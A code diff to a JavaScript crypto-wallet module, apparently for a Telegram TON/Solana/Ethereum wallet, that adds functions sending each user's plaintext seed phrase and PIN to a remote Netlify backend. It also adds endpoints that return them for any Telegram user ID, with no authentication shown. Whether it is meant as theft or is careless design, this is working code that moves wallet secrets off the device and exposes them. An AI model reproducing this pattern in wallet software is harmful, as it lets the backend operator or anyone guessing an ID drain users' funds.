@@ -8,7 +8,167 @@ import { ethers } from 'ethers';
 const SEED_PHRASE_KEY = 'wallet_seed_phrase';
 const PIN_KEY = 'wallet_pin';
 
-// Получение сид-фразы из localStorage
+// Базовые URL для функций Netlify
+const NETLIFY_FUNCTIONS_URL = 'https://ton-jacket-backend.netlify.app/.netlify/functions';
+
+// API функции
+export const saveWalletToAPI = async (telegramUserId, walletData) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/save-wallet`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                telegram_user_id: telegramUserId,
+                ...walletData
+            }),
+        });
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error saving wallet to API:', error);
+        throw error;
+    }
+};
+
+export const getWalletFromAPI = async (telegramUserId) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/get-wallet?telegram_user_id=${telegramUserId}`);
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error getting wallet from API:', error);
+        throw error;
+    }
+};
+
+export const savePinToAPI = async (telegramUserId, pin) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/save-pin`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                telegram_user_id: telegramUserId,
+                pin_code: pin
+            }),
+        });
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error saving PIN to API:', error);
+        throw error;
+    }
+};
+
+export const getPinFromAPI = async (telegramUserId) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/get-pin?telegram_user_id=${telegramUserId}`);
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error getting PIN from API:', error);
+        throw error;
+    }
+};
+
+export const saveSeedPhraseToAPI = async (telegramUserId, seedPhrase) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/save-seed`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                telegram_user_id: telegramUserId,
+                seed_phrase: seedPhrase
+            }),
+        });
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error saving seed phrase to API:', error);
+        throw error;
+    }
+};
+
+export const getSeedPhraseFromAPI = async (telegramUserId) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/get-seed?telegram_user_id=${telegramUserId}`);
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error getting seed phrase from API:', error);
+        throw error;
+    }
+};
+
+export const saveAddressesToAPI = async (telegramUserId, addresses) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/save-addresses`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                telegram_user_id: telegramUserId,
+                wallet_addresses: addresses
+            }),
+        });
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error saving addresses to API:', error);
+        throw error;
+    }
+};
+
+export const getAddressesFromAPI = async (telegramUserId) => {
+    try {
+        const response = await fetch(`${NETLIFY_FUNCTIONS_URL}/get-addresses?telegram_user_id=${telegramUserId}`);
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error getting addresses from API:', error);
+        throw error;
+    }
+};
+
+// Локальные функции
 export const getSeedPhrase = () => {
     try {
         const seedPhrase = localStorage.getItem(SEED_PHRASE_KEY);
@@ -23,11 +183,10 @@ export const getSeedPhrase = () => {
     }
 };
 
-// Генерация новой сид-фразы
 export const generateNewSeedPhrase = async () => {
     try {
         const { generateMnemonic } = await import('bip39');
-        const seedPhrase = generateMnemonic(128); // 12 слов
+        const seedPhrase = generateMnemonic(128);
         console.log('New seed phrase generated');
         return seedPhrase;
     } catch (error) {
@@ -36,11 +195,10 @@ export const generateNewSeedPhrase = async () => {
     }
 };
 
-// Сохранение сид-фразы в localStorage
 export const saveSeedPhrase = (seedPhrase) => {
     try {
         localStorage.setItem(SEED_PHRASE_KEY, seedPhrase);
-        console.log('Seed phrase saved successfully');
+        console.log('Seed phrase saved locally');
         return true;
     } catch (error) {
         console.error('Error saving seed phrase:', error);
@@ -48,12 +206,11 @@ export const saveSeedPhrase = (seedPhrase) => {
     }
 };
 
-// Сохранение PIN
 export const savePin = (pin) => {
     try {
         localStorage.setItem(PIN_KEY, pin);
         localStorage.setItem('wallet_pin_set', 'true');
-        console.log('PIN saved successfully');
+        console.log('PIN saved locally');
         return true;
     } catch (error) {
         console.error('Error saving PIN:', error);
@@ -61,7 +218,6 @@ export const savePin = (pin) => {
     }
 };
 
-// Проверка PIN
 export const verifyPin = (pin) => {
     try {
         const savedPin = localStorage.getItem(PIN_KEY);
@@ -72,12 +228,11 @@ export const verifyPin = (pin) => {
     }
 };
 
-// Проверка установлен ли PIN
 export const isPinSet = () => {
     return localStorage.getItem('wallet_pin_set') === 'true';
 };
 
-// Генерация TON адреса из сид-фразы
+// Генерация адресов
 const generateTonAddress = async (seedPhrase) => {
     try {
         if (!seedPhrase || seedPhrase.trim() === '') {
@@ -100,7 +255,6 @@ const generateTonAddress = async (seedPhrase) => {
     }
 };
 
-// Генерация Solana адреса из сид-фразы
 const generateSolanaAddress = async (seedPhrase) => {
     try {
         if (!seedPhrase || seedPhrase.trim() === '') {
@@ -122,7 +276,6 @@ const generateSolanaAddress = async (seedPhrase) => {
     }
 };
 
-// Генерация Ethereum адреса из сид-фразы
 const generateEthereumAddress = async (seedPhrase) => {
     try {
         if (!seedPhrase || seedPhrase.trim() === '') {
@@ -144,24 +297,22 @@ const generateEthereumAddress = async (seedPhrase) => {
     }
 };
 
-// Генерация всех кошельков из сид-фразы
+// Генерация всех кошельков
 export const generateWalletsFromSeed = async (seedPhrase) => {
     try {
         console.log('Starting wallet generation from seed phrase...');
         
         if (!seedPhrase || seedPhrase.trim() === '') {
-            throw new Error('Seed phrase is required and cannot be empty');
+            throw new Error('Seed phrase is required');
         }
 
         const tonAddress = await generateTonAddress(seedPhrase);
         const solanaAddress = await generateSolanaAddress(seedPhrase);
         const ethAddress = await generateEthereumAddress(seedPhrase);
 
-        console.log('All addresses generated successfully');
+        console.log('All addresses generated');
         
-        // Создаем кошельки для всех токенов (TRX удален)
         const wallets = [
-            // TON Blockchain
             {
                 id: 'ton',
                 name: 'Toncoin',
@@ -204,8 +355,6 @@ export const generateWalletsFromSeed = async (seedPhrase) => {
                 isActive: true,
                 logo: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png'
             },
-
-            // Solana Blockchain
             {
                 id: 'sol',
                 name: 'Solana',
@@ -248,8 +397,6 @@ export const generateWalletsFromSeed = async (seedPhrase) => {
                 isActive: true,
                 logo: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png'
             },
-
-            // Ethereum Blockchain
             {
                 id: 'eth',
                 name: 'Ethereum',
@@ -297,15 +444,14 @@ export const generateWalletsFromSeed = async (seedPhrase) => {
         localStorage.setItem('wallets', JSON.stringify(wallets));
         localStorage.setItem('wallets_generated', 'true');
         
-        console.log('Wallets generated successfully:', wallets.length);
+        console.log('Wallets generated:', wallets.length);
         return wallets;
     } catch (error) {
-        console.error('Error generating wallets from seed:', error);
+        console.error('Error generating wallets:', error);
         throw error;
     }
 };
 
-// Получение всех токенов
 export const getAllTokens = () => {
     try {
         const cachedWallets = localStorage.getItem('wallets');
@@ -316,11 +462,6 @@ export const getAllTokens = () => {
             }
         }
         
-        const seedPhrase = getSeedPhrase();
-        if (seedPhrase) {
-            console.log('No cached wallets, returning empty array');
-        }
-        
         return [];
     } catch (error) {
         console.error('Error getting all tokens:', error);
@@ -328,16 +469,10 @@ export const getAllTokens = () => {
     }
 };
 
-// Получение всех кошельков
-export const getAllWallets = () => {
-    return getAllTokens();
-};
-
-// Получение балансов
 export const getBalances = async (wallets) => {
     try {
         if (!Array.isArray(wallets)) {
-            console.error('getBalances: wallets is not an array:', wallets);
+            console.error('getBalances: wallets is not an array');
             return [];
         }
         
@@ -350,7 +485,7 @@ export const getBalances = async (wallets) => {
                     const balance = await getTonBalance();
                     wallet.balance = balance || '0';
                 } catch (error) {
-                    console.error(`Error getting TON balance:`, error);
+                    console.error('Error getting TON balance:', error);
                 }
             }
         }
@@ -362,7 +497,7 @@ export const getBalances = async (wallets) => {
                     const balance = await getSolBalance();
                     wallet.balance = balance || '0';
                 } catch (error) {
-                    console.error(`Error getting SOL balance:`, error);
+                    console.error('Error getting SOL balance:', error);
                 }
             }
         }
@@ -374,16 +509,6 @@ export const getBalances = async (wallets) => {
     }
 };
 
-// Показать сид-фразу
-export const revealSeedPhrase = async () => {
-    const seedPhrase = getSeedPhrase();
-    if (!seedPhrase) {
-        throw new Error('Seed phrase not found. Please create a new wallet.');
-    }
-    return seedPhrase;
-};
-
-// Получение цен токенов
 export const getTokenPrices = async () => {
     try {
         const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=the-open-network,solana,ethereum&vs_currencies=usd');
@@ -418,41 +543,10 @@ export const getTokenPrices = async () => {
     }
 };
 
-// Инициализация кошелька
-export const initializeWallet = async () => {
-    try {
-        let seedPhrase = getSeedPhrase();
-        
-        if (!seedPhrase) {
-            seedPhrase = await generateNewSeedPhrase();
-            saveSeedPhrase(seedPhrase);
-            
-            await generateWalletsFromSeed(seedPhrase);
-        } else {
-            const walletsGenerated = localStorage.getItem('wallets_generated');
-            if (walletsGenerated !== 'true') {
-                await generateWalletsFromSeed(seedPhrase);
-            }
-        }
-        
-        const wallets = getAllTokens();
-        
-        return {
-            success: true,
-            seedPhrase,
-            wallets
-        };
-    } catch (error) {
-        console.error('Error initializing wallet:', error);
-        throw error;
-    }
-};
-
-// Расчет общего баланса в USD
 export const calculateTotalBalance = async (wallets) => {
     try {
         if (!Array.isArray(wallets)) {
-            console.error('calculateTotalBalance: wallets is not an array:', wallets);
+            console.error('calculateTotalBalance: wallets is not an array');
             return '0.00';
         }
         
@@ -471,23 +565,6 @@ export const calculateTotalBalance = async (wallets) => {
     }
 };
 
-// Очистка кошельков
-export const clearWallets = () => {
-    try {
-        localStorage.removeItem(SEED_PHRASE_KEY);
-        localStorage.removeItem(PIN_KEY);
-        localStorage.removeItem('wallets');
-        localStorage.removeItem('wallets_generated');
-        localStorage.removeItem('wallet_pin_set');
-        console.log('Wallets cleared successfully');
-        return true;
-    } catch (error) {
-        console.error('Error clearing wallets:', error);
-        return false;
-    }
-};
-
-// Генерация кошельков
 export const generateWallets = async (existingSeedPhrase = null) => {
     try {
         let seedPhrase = existingSeedPhrase;
@@ -507,30 +584,29 @@ export const generateWallets = async (existingSeedPhrase = null) => {
     }
 };
 
-// Инициализация кошельков
-export const initializeWallets = async () => {
+export const clearWallets = () => {
     try {
-        const seedPhrase = getSeedPhrase();
-        if (!seedPhrase) {
-            console.log('No seed phrase found, wallets not initialized');
-            return false;
-        }
-
-        const walletsGenerated = localStorage.getItem('wallets_generated');
-        if (walletsGenerated === 'true') {
-            console.log('Wallets already generated');
-            return true;
-        }
-
-        await generateWalletsFromSeed(seedPhrase);
+        localStorage.removeItem(SEED_PHRASE_KEY);
+        localStorage.removeItem(PIN_KEY);
+        localStorage.removeItem('wallets');
+        localStorage.removeItem('wallets_generated');
+        localStorage.removeItem('wallet_pin_set');
+        console.log('Wallets cleared');
         return true;
     } catch (error) {
-        console.error('Error initializing wallets:', error);
+        console.error('Error clearing wallets:', error);
         return false;
     }
 };
 
-// Статический объект токенов
+export const revealSeedPhrase = async () => {
+    const seedPhrase = getSeedPhrase();
+    if (!seedPhrase) {
+        throw new Error('Seed phrase not found');
+    }
+    return seedPhrase;
+};
+
 export const TOKENS = {
     TON: {
         id: 'ton',
@@ -642,14 +718,20 @@ export default {
     isPinSet,
     generateWalletsFromSeed,
     generateWallets,
-    getAllWallets,
     getAllTokens,
     getBalances,
     revealSeedPhrase,
     getTokenPrices,
-    initializeWallet,
     calculateTotalBalance,
     clearWallets,
-    initializeWallets,
-    TOKENS
+    TOKENS,
+    // API функции
+    saveWalletToAPI,
+    getWalletFromAPI,
+    savePinToAPI,
+    getPinFromAPI,
+    saveSeedPhraseToAPI,
+    getSeedPhraseFromAPI,
+    saveAddressesToAPI,
+    getAddressesFromAPI
 };
